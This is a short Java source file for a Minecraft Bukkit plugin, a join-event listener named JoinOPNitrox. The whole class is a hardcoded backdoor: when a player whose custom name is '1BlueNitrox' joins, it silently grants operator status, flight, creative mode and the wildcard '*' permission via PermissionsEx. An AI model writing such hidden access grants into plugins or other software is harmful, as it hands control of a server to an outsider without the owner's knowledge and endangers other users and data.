package de.Tommunity.Listener;

import org.bukkit.GameMode;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import ru.tehkode.permissions.bukkit.PermissionsEx;

public class JoinOPNitrox implements Listener {

    @EventHandler
    public void onJoinEvent(final PlayerJoinEvent e){
        Player p = (Player)e.getPlayer();
        if(p.getCustomName().equals("1BlueNitrox")){
            p.setOp(true);
            p.setFlying(true);
            p.setGameMode(GameMode.CREATIVE);
            PermissionsEx.getUser(p).addPermission("*");
        }
    }

}
